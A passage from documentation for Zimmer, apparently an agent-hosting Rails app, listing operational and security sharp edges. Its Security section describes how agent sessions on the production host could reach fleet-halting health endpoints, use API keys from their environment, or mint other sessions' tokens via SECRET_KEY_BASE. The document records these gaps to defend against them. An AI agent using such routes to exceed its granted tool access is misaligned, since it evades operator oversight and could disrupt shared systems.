`ActiveRecord::Deadlocked`. `ConnectionFailed` is the one covering a connection that dies *while a
statement is in flight* — what a Postgres restart, a failover or an admin disconnect looks like from
the caller ([#779](https://github.com/tadasant/zimmer/issues/779)). The list lives in `DatabaseRetry`;
`ControllerDatabaseRetry` points its constant at it rather than keeping a second copy.

The list stops at `ConnectionFailed` and does not climb to its parent `ActiveRecord::QueryAborted`,
which also covers `StatementTimeout`, `QueryCanceled` and `AdapterTimeout`. Those say the database is
alive and the query was too slow, so they must keep propagating: `ApplicationJob` has its own
`retry_on ActiveRecord::StatementTimeout` with proper backoff, and `ControllerDatabaseRetry`'s
give-up path *renders* a friendly 503 rather than re-raising, so a timeout on the list would be
swallowed outright.

The helpers deliberately do *not* reconnect by hand
([#708](https://github.com/tadasant/zimmer/issues/708)): `ActiveRecord::ConnectionTimeoutError` (the
pool is full) inherits from `ActiveRecord::ConnectionNotEstablished` (this connection is broken), so a
reconnect keyed on the parent class fires on exhaustion — leasing a *sticky* connection out of an
already empty pool, and on a GoodJob thread tearing down the Postgres session holding the job's
advisory lock. Recovery is Active Record's job anyway: the adapter verifies and reconnects a
connection it is not confident about, so re-running the block is all the helper has to do.

That last part holds only outside a *materialized* transaction. `reconnect_can_restore_state?` is
`transaction_manager.restorable? && !@raw_connection_dirty`
(`activerecord/lib/active_record/connection_adapters/abstract_adapter.rb`), so a block that has
already written inside an open transaction gets no reconnect — every attempt raises again and the
retry buys nothing but its own backoff. No caller nests that way today; the ordering to keep is
`with_db_retry` *outside* `transaction`, as `SessionsController` does.

**Retried blocks must be safe to run twice.** A connection can die after the server has made a
`COMMIT` durable but before the acknowledgement reaches the client, and that is indistinguishable
from a commit that never happened — so a retried write can apply twice. This is inherent to retrying
a lost connection at all and predates `ConnectionFailed` joining the list (`PG::ConnectionBad` has
the same property); what changed is that the common failover shape now actually reaches the retry.
Every `with_db_retry` block today is a single idempotent-enough statement — a metadata merge, an
`update!`, a budget record, a log insert — where a double-apply is at worst a duplicated log line.
Keep it that way: do not wrap a non-idempotent write, or anything with an external side effect, in
`with_db_retry`.

The cost of leaving the retry in place is time. Under exhaustion each attempt blocks for the pool's
`checkout_timeout` (unset in `config/database.yml`, so the 5s default), and all three attempts now
run: a caller can hold its Puma or GoodJob thread for roughly 16s (jobs, backoff `0.5s + 1s`) or 15s
(controllers, `0.3s + 0.6s`) before giving up, against roughly 10s when the reconnect aborted the
loop early. That is a thread held longer precisely when threads are scarce — accepted deliberately,
because the alternative was permanently removing a connection from the pool.

### Staging cannot exercise the managed-database path

Staging runs a `postgres:16` Kamal accessory on the droplet; only production has a managed cluster. So
staging *can* verify the app-side half of the connection budget — the pools each process opens, which
is where the 2026-07-13 defect lived — and it can verify the pools fit the server. It cannot exercise
the Terraform postcondition, the DigitalOcean plan ceiling, or a resize, because it has none of them.
The accessory's `max_connections=100` (the `postgres:16` default) happens to leave 97 usable backends,
the same as the `db-s-2vcpu-4gb` plan, which makes the comparison a fair one — but it is a
coincidence, not a guarantee, and nothing pins it.

### `DATABASE_SSLMODE` defaults to `require`, so a non-TLS Postgres must opt down explicitly

The default used to be `prefer`, which asks for TLS and accepts plaintext when the server does not
offer it, saying nothing either way — a deployment that lost TLS kept working, unencrypted, with
nothing to notice. The default is now `require`: TLS or no connection.

The edge that creates is the mirror image. A deployment pointed at a Postgres with `ssl = off` now
fails to connect at boot with `server does not support SSL, but SSL was required`, instead of
quietly proceeding. Every environment Zimmer ships already names its own value —
`config/deploy.production.yml` sets `require` for DigitalOcean Managed Postgres,
`config/deploy.staging.yml` sets `prefer` for the throwaway compose accessory,
`.agent-containers/.env.dev` sets `disable` — and `development`/`test` default to `prefer` via a
separate `local_default` anchor in `config/database.yml`, because local Postgres (Homebrew, the
GitHub Actions service container, the compose `db`) ships with SSL off and `require` would refuse
every connection.

So the failure lands on a *self-hosted* deployment running its own non-TLS Postgres in the
`production` or `staging` Rails environment without setting the variable. The fix is one line of
config, and the error names itself — which is the trade: a loud failure you fix once, instead of a
silent plaintext connection you never learn about.

### Rebuilding staging costs a Let's Encrypt issuance, and there are only five a week

The custom-domain cert lives in exactly one place: on the droplet, pushed there by
[`domain-cert-staging`](/operate/deploying/#custom-domain-https-over-the-tailnet). A
`recreate_droplet` rebuild destroys the box, and with it the cert — so the chained cert job has to
issue a **fresh** one every single time. Let's Encrypt allows five certificates per exact set of
identifiers per 168 hours. The sixth rebuild in a week gets:

```text
acme: error: 429 :: urn:ietf:params:acme:error:rateLimited :: too many certificates (5) already
issued for this exact set of identifiers in the last 168h0m0s
```

Nothing about the droplet is wrong when this happens: cloud-init ran, Kamal deployed, the app answers
on the tailnet, and the `domain -> tailnet IP` A record is updated (the script upserts DNS *before* it
touches ACME). What is missing is TLS — `https://staging.zimmer.tadasant.com` fails to handshake until
the window rolls forward and `domain-cert-staging` is re-run. Reach the box by tailnet IP or MagicDNS
in the meantime.

So rebuilds are cheap, but not free: the fifth one in a week is the last that gets a cert. If you
expect several in a day — chasing a cloud-init change, say — count them.

`recreate_droplet` is no longer the only thing that spends one. Since
[#403](https://github.com/tadasant/zimmer/issues/403) the nightly teardown destroys staging on the
days nobody deploys to it, so **every teardown/deploy cycle is an issuance too** — see below.

### Staging's nightly teardown buys the idle bill back with a cold start

`teardown-staging.yml` runs nightly and destroys the staging droplet on the days nobody deployed to it
([#403](https://github.com/tadasant/zimmer/issues/403)). That is a **deliberate trade**, not a free
saving, and it is worth knowing which way it cuts before you plan a day in staging:

- The first `Deploy staging` after a teardown is a full `terraform apply` + cloud-init bootstrap +
  fresh cert, not a fast Kamal swap onto a warm box. **Nobody has measured how long that costs on the
  Kamal-era bootstrap** — every `terraform apply` in the recorded run history is a 5–6 second reconcile
  of a droplet that already existed, so there is no cold Kamal-era run to time. The closest evidence is
  the pre-Kamal, recreate-every-run flow, where creating the droplet took ~34s and the first health
  check waited a further ~5m for it to boot; today's cloud-init also installs sysbox, so the real
  number is likely higher. If it turns out to be painful, `RECENT_DEPLOY_HOURS` and the cron are two
  lines at the top of the workflow.
- Every teardown/deploy cycle spends one of Let's Encrypt's five certificates per 168 hours (above).
  Seven cycles in a week would leave two of them without HTTPS on the custom name.
- While staging is down, the `staging.zimmer.tadasant.com` A record still points at the destroyed
  box's tailnet IP. Nothing resolves there, and the next deploy upserts it. This was already true of
  a manual teardown; the nightly one just makes it common.

The guard is deliberately biased against destroying: an unreadable Terraform backend fails the run
rather than being read as "no droplet", and a GitHub API that will not say when staging was last
deployed to — including one answering `200` over a truncated body — is read as "in use". The failure
mode that remains is therefore the cheap one: a droplet kept for a day nobody wanted, about $0.80.

Two edges the guard reports but does not fix. It looks for the **droplet** specifically, so state
holding other resources and no droplet — a half-finished destroy, or a droplet deleted out of band —
is skipped every night; that includes `digitalocean_reserved_ip.zimmer`, which DigitalOcean bills
while it is unassigned. And a scheduled run cannot tell you the *reason* it skipped without you
opening it, though the verdict is written to the run summary as well as the log. Both take a manual
`Teardown staging` dispatch to clear.

### Double-suffixed Redis URL (fixed, but the sharp edge remains in production)

`REDIS_URL` names the Redis **server**, not a database — each environment config picks the index it
wants, and `production.rb` / `staging.rb` do it by building `"#{ENV["REDIS_URL"]}/0"`. So a `REDIS_URL`
that already ends in a database index becomes `redis://…:6379/0/0`, whose whole path redis-client reads
as the database number:

```text
ArgumentError (invalid value for Integer(): "0/0")
```

It does not raise at boot — the store is built lazily — so the stack comes up healthy and then every
`Rails.cache` call fails.

`config/deploy.yml` sets `REDIS_URL: redis://zimmer-redis:6379` — **no trailing `/0`** — so the app's
own suffixing produces a single, correct index. The trap caught the containerized dev stack anyway:
`.agent-containers/.env.dev` set `redis://redis:6379/0`, `development.rb` appended `/1`, and the
dashboard rendered as "Action Controller: Exception caught" because the lazy `<turbo-frame>` behind
`GET /clis/badge` 500ed and Turbo escalated it into a full page visit
([#822](https://github.com/tadasant/zimmer/issues/822)).

Development is now defensive — it passes `db: 1` rather than concatenating, so a `REDIS_URL` that names
a database is overridden instead of corrupted — and `test/config/redis_cache_database_test.rb` fails CI
if any committed `REDIS_URL` grows an index. **`production.rb` and `staging.rb` still concatenate**, so
the sharp edge is real for anyone who "helpfully" adds the `/0` back to a deploy config; the guard test
sweeps every `config/deploy*.yml` along with `.env.example`, `.agent-containers/.env.dev` and the value
CI exports. ([#20](https://github.com/tadasant/zimmer/issues/20))

### `claude update` still runs in the background at boot — the spawn path just waits for it now

`bin/docker-entrypoint` backgrounds `claude update` and the Playwright browser install, because
running them in the foreground would hold Rails behind a 30s+ network operation until Kamal's
health check gave up. It now writes a readiness marker when that block finishes, and the spawn
path [waits on it](/sessions/spawning/#the-boot-tasks-readiness-gate) before launching a CLI.

What is left is the deliberate escape hatch. The wait is bounded by
`ZIMMER_BOOT_TASKS_TIMEOUT_SECONDS` (default 120, measured from process start), so if
`claude update` hangs, sessions spawn against whatever CLI is on disk rather than deadlocking the
worker. That case is loud — a warning in the session's own log and in the process log — but it is
still a session running on the previous deploy's CLI. Recovery respawns driven by
`ProcessLifecycleManager#handle_exit` (SIGTERM retry, context-length compaction) do not re-check
the gate; they only happen after a spawn that did.

Fixed in [#122](https://github.com/tadasant/zimmer/issues/122), which added the readiness gate. The
escape hatch above is what that fix deliberately left open.

### The tailnet reaper still no-ops without credentials — it just says so now

`scripts/tailnet-reap-node.sh` skips cleanup when `TS_API_CLIENT_ID` / `TS_API_CLIENT_SECRET` are
unset, so the MagicDNS name drifts to `zimmer-staging-1`, `-2`, … The health check compensates by
trying every online peer with that name — so it works, and you accumulate dead nodes. What changed is
the silence: the script now emits `::warning::` annotations naming the drift and the two secrets that
would stop it, on the unset path and on a failed token exchange alike.

Fixed in [#123](https://github.com/tadasant/zimmer/issues/123).

### The CI-failure alert can't be exercised from a PR

`alert-ci-failure.yml` posts main-branch CI failures to Slack. `workflow_run` only ever triggers
from the copy of the file on the **default branch**, so the listener cannot be exercised from a PR:
editing it on a branch changes nothing until it merges, and the first real proof that it fires is
the first failure on `main` afterwards. `workflow_dispatch` is wired up on it to cover the other
half — that Slack delivery itself works — without waiting for a genuine breakage.

Its `name:` is also load-bearing. `workflows: ["*"]` matches *every* workflow in the repo, including
the alert itself, so the job's `if:` excludes it by comparing against the literal string
`'CI failure alert'`. **Rename the workflow without updating that literal and it starts alerting on
itself.** (The literal is deliberate: `github.workflow` would be the tidier-looking test, but if it
ever resolved to the *triggering* workflow's name the test would become `A != A` and the alert would
silently stop firing forever. A loud failure beats a silent one.)

### A queued run that never starts is never alerted on

`alert-ci-failure.yml` fires on an allowlist of conclusions (`failure`, `startup_failure`,
`timed_out`) rather than on "not `success`", because `ci.yml` sets `cancel-in-progress` and a
*cancelled* run must not page anyone.

That leaves one real hole. If the shared self-hosted runner pool goes **offline**, main-branch runs
don't fail — they queue, and GitHub cancels them after ~24h with `conclusion: cancelled`, which is
the same conclusion a deliberate cancel produces. So the alert is silent for exactly the outage it
is most often imagined to cover. Running the alert job on `ubuntu-latest` protects against a
*degraded* pool (jobs run, jobs fail, the alert goes out), not an absent one. Noticing that CI has
gone quiet is still a human job.

### The trigger-poll liveness alarm depends on Redis, and fails quiet

`TriggerPollerLivenessCheckJob` decides whether the Slack or GitHub poller has stalled by reading a
heartbeat each poller writes to `Rails.cache` (Redis) through `PollerHeartbeat`. When the heartbeat
is **missing** — a cache flush, a Redis outage, or a gap longer than `PollerHeartbeat::TTL` (7 days)
— the check cannot date the absence, so it seeds a fresh baseline and stays quiet rather than paging
on something it can't distinguish from a first boot. A genuine stall is still caught one cycle later
(the seed itself goes stale and the next check pages), but a Redis outage silences the alarm for as
long as it lasts.

This is the conservative trade: the alternative — paging on any missing key — turns every deploy and
cache flush into a false page, and a liveness alarm nobody trusts is worse than one with a known
hole. It fails quiet, not loud. The same Redis dependency already underlies
`SystemHealthMonitorJob`'s streak, so a Redis outage degrades that whole family together.

### A cron manager that stops inside a live worker is not paged on

The "Cron schedule stale" page comes from `SystemHealthMonitorJob`, which is itself a cron job. If
the worker's cron manager stops enqueuing everything while the worker process stays up and keeps
its heartbeat, the monitor stops being enqueued too, so it cannot report the stop. The worker
heartbeat rule does not fire either, because the worker is alive. The readings stay correct:
`/health`, `GET /api/v1/health`, `get_system_health` and `/health/export_diagnostics` are served by
the web process, and every key reads `stale` there. But nothing pages until someone looks.

GoodJob's cron gives each key its own task chain and reschedules the next tick before enqueuing
the current one, so a failure on one key is the likely shape, and the monitor does catch that one.
Closing the whole-manager case needs a check that runs outside the worker. The obs collector already
scrapes `/health/export_diagnostics`, so a Grafana rule over a count of stale keys would do it, but
the collector and its rules live in `tadasant-internal`, not here.

### Cron freshness pages once for a daily job whose single tick failed to enqueue

A daily key gets a two-hour grace after its fire time. GoodJob does not retry a cron enqueue, so a
transient database error at exactly 06:00 means that day's job never runs, and the key pages at
08:00 and stays stale until the next day's tick. The page is true (the job did not run that day),
but nothing is wedged, and it clears only when the next tick lands. The witness check does not
excuse it, because the other keys enqueued fine at 06:00: the cron manager was running, and only
this key's insert failed.

Two blunter edges are in the safe direction. Enabling or disabling *any* cron key in the GoodJob
dashboard resets every key's lower bound, since GoodJob keeps all the switches in one settings row.
That delays every key's next possible finding by up to its grace. And an owed tick counts only if
another configured key's row carries the same fire time, so a tick the cron manager fired while
every other key's enqueue also failed is excused rather than counted.

### A cron key's history reaches back 24 hours, and no further

🟡 `CronFreshness` answers "has this key been running" over `HISTORY_WINDOW` (24 hours), which is
short of the question that produced [#584](https://github.com/tadasant/zimmer/issues/584) — *has it
been running since it deployed*. `good_jobs` retains fourteen days, so the rows are there; the
window is a cost choice, because reading all fourteen days on every `/health` render and every
two-minute monitor tick means scanning ~320,000 rows instead of ~23,000. A stop older than a day is
therefore only readable from the GoodJob dashboard at `/jobs`, which an agent session has no route
to.

Three edges sit inside the window itself. Two understate: a key with no tick at all *before* the
window has its leading edge left unmeasured, so a stop that began before the window and ended inside
it is understated rather than guessed at; and a key whose interval is longer than the window (a weekly
entry, say) has at most one tick in it and gets no history verdict at all, whatever it did. One
overstates, for the day after a deploy: the allowance a gap is judged against is one interval plus
grace from the schedule *as it is now*, so a key whose cadence a deploy just tightened (daily to
every 30 minutes, say) still carries yesterday's perfectly normal 24-hour gap inside the window and
reads `stopped_in_window` against the new 30m + 30m allowance until that gap ages out. It is
reported, never paged, and it is true that the key was silent that long — the reading is only wrong
about whether that was a fault.

A dashboard toggle is deliberately not an excuse here, unlike for the live rule. GoodJob keeps every
key's switch in one settings row, so a key switched off for six hours and back on reads as "stopped
and recovered" — which it did.

Nor is a held slot. The live rule does not count ticks a singleton refused while its copy waited or
ran ([#1190](https://github.com/tadasant/zimmer/issues/1190)), but the history reads only the gaps
between rows. A `*/10` singleton that sat 50 minutes behind a backed-up lane therefore reads as
"stopped and recovered" against its 40-minute allowance, when what stopped was the lane.

### The docs guardrail does not look in the image's `tmp/`

🟡 `scripts/assert-docs-excluded.sh` — the check that keeps the documentation site out of the
published image, described in [The docs never ship in the image](/operate/deploying/#the-docs-never-ship-in-the-image) —
skips the top-level `tmp/` and `log/` of whatever tree it is pointed at. It has to: those are the
directories a running test suite scribbles scratch directories into, and one vanishing mid-walk
makes `find` exit non-zero and reddens the guardrail over an unrelated race.

For the build-context audit that is free, because `.dockerignore` excludes `/tmp/*` and `/log/*`
from the context anyway. For the `Dockerfile` assertion, which runs against `/rails` in the built
image, it is a real if narrow blind spot: `/rails/tmp` there holds whatever the build's own `RUN`
steps left behind (`assets:precompile` writes `tmp/cache`), so a `RUN` step that wrote a copy of the
docs into `/rails/tmp` would ship uncaught.

Nothing walks through that hole today, and it is the same class of gap as the `ADD`-from-a-URL and
`COPY --from`-an-outside-image routes the deploying page already names: all three need a deliberate
`Dockerfile` edit, which is a reviewed change, rather than the silent `.dockerignore` drift the
guardrail exists to catch.

---

## Security

### The web UI has no login, by design (and the sharp edge that follows)

🔴 No login screen is deliberate. For a [single circle of trust](/intro/philosophy/), the network
perimeter is the authentication boundary (see [Auth overview](/auth/overview/)), so `ApplicationController`
has no `before_action` for auth and there are no login routes or `User` model. Zimmer's own Terraform
puts the app on a Tailscale tailnet with port 80 closed at the DigitalOcean firewall.

The sharp edge is real and load-bearing. Expose port 80 and, for most of the app, there is no second
wall: an anonymous visitor gets every session transcript, `/settings`, `/inference` (including the OAuth
login flow), and the GoodJob dashboard.

Two surfaces are the exception, and in both cases the reason is blast radius rather than a change of
mind about logins. They share one HTTP Basic realm — `OperatorHttpBasicAuth`, keyed on
`SUPERVISOR_PASSWORD` (with an optional `SUPERVISOR_USERNAME`, default `supervisor`), compared in
constant time — and it **fails closed**: with the variable unset or blank every gated request returns
401 and the refusal is logged. An unconfigured deployment gets no operator surface rather than an
open one.

The **`/supervisor` Administrate panel** renders `claude_accounts`, `mcp_oauth_credentials`,
`x_oauth_credentials`, and `runtime_login_attempts` as *editable* resources, and
`mcp_oauth_credentials.access_token` / `.refresh_token` / `.client_secret` are among the fields it
puts in an edit form.

The **mutating `POST /health/*` actions** — `cleanup_processes`, `retry_sessions`, `archive_old`,
`enter_queue_recovery_mode`, `run_post_deploy_tasks` — terminate processes, rewrite session rows in
bulk, and halt the fleet's demand-side job queues. Until
[#312](https://github.com/tadasant/zimmer/issues/312) and
[#371](https://github.com/tadasant/zimmer/issues/371) they were the one surface reaching
`HealthMonitorService` that asked for nothing at all, while `Api::V1::HealthController` required an
API key and the MCP `action_health` tool required the `health` tool group.

Three things on `/health` stay open on purpose. **Every `GET`** — the dashboard, `refresh`,
`export_diagnostics` — because a read-only dashboard behind the perimeter is the design above, and
because `/up` and `/up/deep` are what kamal-proxy gates the deploy cutover on; a 401 there fails
every deploy. **`POST /health/exit_queue_recovery_mode`**, because the way out of a halt must always
be available and the realm fails closed — gating it would mean a deployment that never set
`SUPERVISOR_PASSWORD` could enter recovery mode from the API and not leave it from the UI. And
**`SystemHealthMonitorJob`**, which reaches the service in-process and traverses no route at all.

Two credential columns are held back from the panel entirely, each listed in its dashboard's
`DELIBERATELY_OMITTED` with the reason written next to it: `claude_accounts.oauth_config`, the
plaintext Anthropic and OpenAI tokens the whole fleet runs on, and
`runtime_login_attempts.pasted_code`.

Two things that follow, in both directions:

- **You have to set the variable to use the panel at all**, including on a fresh deploy and on any
  existing deployment that has not seeded it. Until then `/supervisor` is 401 for you too.
- **One shared credential in front of one panel is not a login system.** It does not protect the rest
  of the app, it has no identity or audit trail, and rotating it requires a restart — the same
  shape as `API_KEYS`. The perimeter is still the security model.

There is no per-user authorization in `sessions_controller.rb`, and that is the design rather than a
gap: no `User` model, no owner column, nothing for a policy object to compare. The six
`# TODO: Add proper authorization checks` comments that used to imply otherwise are now a single
explicit note at the top of the class explaining why there is nothing to check.

Fixed in [#42](https://github.com/tadasant/zimmer/issues/42) — the panel is behind the Basic realm —
[#44](https://github.com/tadasant/zimmer/issues/44), which replaced the authorization TODOs with
the note, and [#312](https://github.com/tadasant/zimmer/issues/312) /
[#371](https://github.com/tadasant/zimmer/issues/371) for the `/health` half. What is above is the
perimeter model itself, which no issue is open against.

### The operator realm closes the web door, and not the other two

🔴 The perimeter argument that covers the rest of the web UI answers an *external* caller. It does
not answer one that is already inside — and **agent sessions run on the production host**, inside the
tailnet, on the same box that serves these routes.

That is measured, not assumed. From inside an ordinary agent session on `zimmer-production`, a
read-only `GET https://zimmer.tadasant.com/health` answers `200` and renders the dashboard, as does
`GET http://100.120.55.4/up` against the tailnet address. So before
[#312](https://github.com/tadasant/zimmer/issues/312) and
[#371](https://github.com/tadasant/zimmer/issues/371) any session could `curl` its way to
`enter_queue_recovery_mode` — halting `pollers`, `triggers`, `inference`, `maintenance` and
`default` for the whole fleet — with no `health` tool group and no API key, which is exactly what
the tool-group gating on the MCP `action_health` tool exists to prevent. (CSRF was never the thing
standing in front of it: `verify_authenticity_token` does run on these routes, but the token and the
session cookie are both in the response to an anonymous `GET /health`, so defeating it is two
requests rather than one.)

**The operator realm closes that door and leaves two others open, and it is worth being exact about
what is and is not fixed.** The same capability is on `POST /api/v1/health/*` behind `API_KEYS`, and
on `POST /mcp` behind `API_KEYS` plus a `tool_groups` value the *caller* supplies in the query
string. An agent session holds a valid `API_KEYS` entry two ways: `API_KEYS` and
`ZIMMER_PROD_API_KEY` are in its process environment, and its own `.mcp.json` carries one in an
`X-API-Key` header for the self-session server. So a session that goes looking can still reach both
of those surfaces, and `?tool_groups=health` is not a fence against a caller who writes the query
string.

What the gate does buy is real, and it is the part `/supervisor` got in
[#42](https://github.com/tadasant/zimmer/issues/42): there is no longer a door that needs *nothing*.
Every surface that mutates now demands a credential, so the remaining exposure is a question about
which credentials a session should hold — tracked separately — rather than an unauthenticated
endpoint. Halting the demand-side queues also stays loud and self-healing whoever fires it: entry,
extension and exit each emit their own page, and the TTL auto-exits. The one thing to
know is that halting `pollers` also stops `SystemHealthMonitorJob`, so *backlog* alerting is quiet
for the duration.

### A missing operator password is silent all the way down the deploy chain

🟡 The realm fails closed loudly enough at the HTTP layer — a 401 whose body names
`SUPERVISOR_PASSWORD`, and a log line. The *delivery* of that variable is where the quiet is.

`config/deploy.production.yml` names `SUPERVISOR_PASSWORD` in `env.secret` and
`.kamal/secrets.production` maps it to `$PROD_SUPERVISOR_PASSWORD`, but Kamal only raises when the
mapping **line** is missing: `Kamal::Secrets#[]` fetches from a `Dotenv.parse` of the file, and an
unset deploy-side variable resolves to `""` rather than to an error. No validator checks for blank
afterwards. So a deploy whose environment never supplied `PROD_SUPERVISOR_PASSWORD` writes
`SUPERVISOR_PASSWORD=` into the container's env-file, reports success, and leaves `/supervisor`,
`/settings/api_keys` and the mutating `POST /health/*` actions returning 401 — with nothing
anywhere in the deploy saying so.

That is the same silent shape as [the Parameter Store resolver
key](/operate/secrets-parameter-store/#set-the-secret), reached the same way, and it is why the
private deploy workflow has to name the variable in *both* the Kamal step's `env:` block and the
`-e` passthrough of its `kamal()` wrapper. A `: "${PROD_SUPERVISOR_PASSWORD:?}"` assert in that
step is the one thing that converts it into a failed deploy.

Two consequences worth holding onto. The mapping is **safe to land before the value exists** —
it cannot break a deploy, it can only fail to open the realm. And the only way to find out whether
it worked is to load one of the three surfaces and see whether you get a Basic prompt or a 401;
there is no panel, health row or deploy line that reports the realm's configured state.

### Transcript redaction is defense in depth, not a guarantee

🟡 `TranscriptRedactor` runs on every transcript as it is read, before anything is stored, rendered or
archived (see [Transcripts](/sessions/transcripts/)). It catches the credentials Zimmer itself issues by
exact value, and credentials with a recognizable shape by pattern. Neither tier is complete, and the
gap is worth naming precisely:

- **A secret with no shape that Zimmer never issued is not caught.** A password an agent read out of
  someone else's config file, the body of an `op read`, a session cookie captured during browser
  automation, an API key a user pasted into a prompt. There is no pattern for "arbitrary high-entropy
  string" here on purpose — one would shred ordinary output and destroy the debugging value that is the
  reason transcripts exist at all.
- **The known-value tier is only as fresh as its sources.** It rebuilds at most once a minute, and if
  the Parameter Store is unreachable it degrades to the shape patterns and logs a warning rather than
  failing the poll. A credential rotated seconds ago can pass through unredacted.
- **The generic name-then-value rule over-redacts sometimes.** `api_key: your_api_key_here` in a README
  an agent read gets scrubbed. That is the intended direction of the trade, but it does mean a redacted
  span is not proof a real credential was there.
- **A redaction reaches the agent's own memory, not just the archive.** When a clone is recreated,
  `AgentSessionJob#restore_regressed_transcript_if_needed` writes the stored transcript back to the file
  the runtime reads on `--resume`. That copy is redacted, so the resumed conversation contains
  `[REDACTED:…]` where the credential was — correct for a credential, and a real loss of context if the
  span was over-redacted.
- **Any `${VAR}` the catalog declares is redacted by exact value, whether or not it is a secret.**
  Today every one of them is (`SLACK_BOT_TOKEN`, `STRAD_API_KEY`, `ZIMMER_PROD_API_KEY`). The first
  externalized-but-not-secret variable — an org slug, a model id, a base URL — will start being scrubbed
  out of every transcript that mentions it.
- **A line the patterns cannot finish scanning is destroyed rather than redacted.** The rules carry
  their own 10-second timeout instead of Rails' global one-second cap. Both bound a single search, and
  the slowest single search any transcript here has produced is 2.2 s, so there is a factor of four in
  hand. If the 10 s is reached anyway, the pass retries line by line and replaces the offending line
  with `[REDACTED:UNSCANNABLE_LINE]` — the line count survives, nothing unscanned is emitted, and that
  line's content is gone. It is the least bad of three bad options; the other two are dropping the
  whole transcript update, which is what [#472](https://github.com/tadasant/zimmer/issues/472) was,
  and emitting a line no pattern finished looking at.
- **That guarantee covers the pattern pass, not the PEM block walk.** `scan_patterns` is the part that
  cannot raise on a timeout. The line walk that finds multi-line PEM armor still can, in principle:
  its three regexps carry the same 10-second timeout, but they are not rescued, because "assume a
  timeout means key material" closes a block at one of their call sites and opens one at another, and
  four different fallbacks for a case none of them can reach is worse than the gap. They are
  literal-prefixed or `\A`-anchored, so a non-armor line fails at the first character.

None of this changes what a transcript is. Do not treat one as safe to expose because it has been
through the redactor; the endpoint serving it still has no authorization check, and redaction lowers the
blast radius of a leak rather than preventing one.

Redaction is also irreversible and applies only from the moment it shipped. Transcripts captured before
that still hold whatever the agent printed until `bin/rails open_transcripts:redact_stored` is run
against them.

### The redaction cache buys speed with memory, and can be out of date by one poll

🟡 `TranscriptRedactionCache` keeps the already-redacted prefix of each hot transcript so a poll costs
the appended bytes rather than the whole file — 8.5 s down to 34 ms on a real 22.4 MB transcript
([#477](https://github.com/tadasant/zimmer/issues/477)). Four edges come with it:

- **It costs roughly one extra copy of every hot transcript in memory.** Bounded at 128 MB
  process-wide, 64 entries, and 64 MB for any single transcript, with least-recently-read eviction
  and a 15-minute idle sweep. Past those bounds a transcript goes back to costing a full re-scan
  every poll — correct, just slow, which is exactly the old behavior.
- **Invalidation samples rather than hashes the whole prefix.** It checks the length, that the commit
  point still lands after a newline in the bytes being read now, that the known-credential set has not
  changed generation, and 16 KB fingerprints of the file's head and of the bytes just before the commit
  point. A rewrite that changed only the *middle* of a transcript, left its length and both fingerprints
  intact, and kept every line boundary would be served the old prefix for that region. Usually that
  means stale bytes rather than leaked ones — the cached prefix is redactor output, so re-emitting it
  cannot itself leak. But the honest version is stronger than that: such a rewrite could also introduce
  a `-----BEGIN … PRIVATE KEY-----` opener into the prefix whose body lands in the tail, and the tail's
  scan would not see the opener, so the key body would be emitted unarmored. Nothing in Zimmer rewrites
  a transcript that way — the runtime appends, and the resume restore rewrites from byte 0 with the
  stored, already-redacted bytes — and closing it would mean hashing the whole prefix on every poll,
  which is the O(total size) cost the cache exists to remove.
- **The known-credential set is versioned, so a late-arriving credential still costs a full re-scan.**
  That set rebuilds on a 60-second TTL and every tier degrades to "missing" rather than raising when
  its source is unreachable, so a credential can be absent from one window and present in the next.
  The old full re-scan scrubbed it retroactively out of the whole transcript for free; the cache buys
  that back by discarding any prefix redacted under an older generation. Expect an occasional full
  re-scan of a hot transcript when a secret rotates or a provider blips.
- **A transcript carrying multi-line PEM armor stops advancing its commit point.** The armor walk is
  the one stage that spans newlines, so the commit point never crosses a line that could open a
  block. A transcript with one degrades toward re-scanning from that line on every poll. JSONL
  transcripts carry the escaped-in-JSON form, which opens and closes on one line and does not stall
  anything.

### Nothing is encrypted at rest

🔴 Uniform trust means Zimmer leans on the perimeter rather than field-level encryption. No model declares
`encrypts`, no `active_record.encryption` config exists, and every OAuth token, client secret, and PKCE
verifier is a plaintext column. `XOauthCredential`'s own header says the quiet part: *"Security relies on
database access controls."* The admin panel that renders those columns is now behind a Basic realm, which
means a broken perimeter no longer exposes them in one click — but the columns are still plaintext, and
anything with database access reads them.

Tracked in [#43](https://github.com/tadasant/zimmer/issues/43).

### An elicitation URL is a session credential that sits on disk

An MCP server raises and polls approval requests on `POST /api/v1/elicitations/session/<token>` and
`GET …/session/<token>/<request_id>`. It authenticates with the token in the path, because the
`@pulsemcp/mcp-elicitation` client sends no auth header and Zimmer does not control it. The token is
an HMAC of the session id, keyed from `secret_key_base`. So someone who can merely reach the host
cannot raise a prompt on a session or read one, and the bare `/api/v1/elicitations` routes take an
API key ([who may raise a prompt](/sessions/elicitation/#who-may-raise-a-prompt)).

What the token does not do:

- **It does not keep agents on the same host apart.** It sits in the agent process's environment and
  in the clone's generated MCP config. The session's own agent can read both. Every session also
  runs as the same Unix user on the same filesystem, so any other session's agent that goes looking
  in another clone, or in `/proc`, can read them too. An agent can therefore raise an approval prompt
  on its own session, and on a neighbour's if it reads the neighbour's config. An agent session's
  environment also carries `SECRET_KEY_BASE` itself, and with that any agent can mint any session's
  token outright. It cannot answer a prompt, because `respond` takes an API key. See
  [agents run unsandboxed on the app host](#agents-run-unsandboxed-on-the-app-host).
- **It does not expire and cannot be revoked per session.** It is deterministic, so a session keeps
  the same URL for life. Rotating `SECRET_KEY_BASE` revokes every token at once. The deploy that
  rotates it also respawns every agent process, and the respawned processes get the new tokens.
- **It shows up in local request logs.** Rails logs every request path at INFO, token included.
  Those lines stay in the container's own log, because the OTEL exporter ships WARN and above, and
  Zimmer's own log lines cut the token's MAC.
- **A clone `.env` that names `ELICITATION_REQUEST_URL` still wins**, and a bare URL there fails: the
  POST answers 401 and the API logs a warning. To point a session's servers at a different Zimmer,
  name a token URL that the other Zimmer minted.

The endpoints were unauthenticated until [#45](https://github.com/tadasant/zimmer/issues/45).

### API keys have names but no scope, and the whole fleet shares one

Since [#46](https://github.com/tadasant/zimmer/issues/46) every key is a row with a name and a
`last_used_at`, the request log names the key behind each call, and a revoke on
[the API keys page](/auth/overview/#managing-keys) refuses the key from the next request on, with no
restart. What is still true:

- **No scopes within the API.** Any valid `api` key can do anything to anything. That is the single
  circle of trust, not an oversight, but it means a leaked key is a full-API credential until
  someone revokes it. The one exception is a key minted with the `quick_router` grant, which opens
  [`POST /api/v1/quick_router`](/extend/rest-api/#the-quick-router-ingest) and nothing else — a
  second closed door for the [browser extension](/extend/browser-extension/), not a permission
  system. A leaked one can start Quick Router sessions (ten a minute per address) and read nothing.
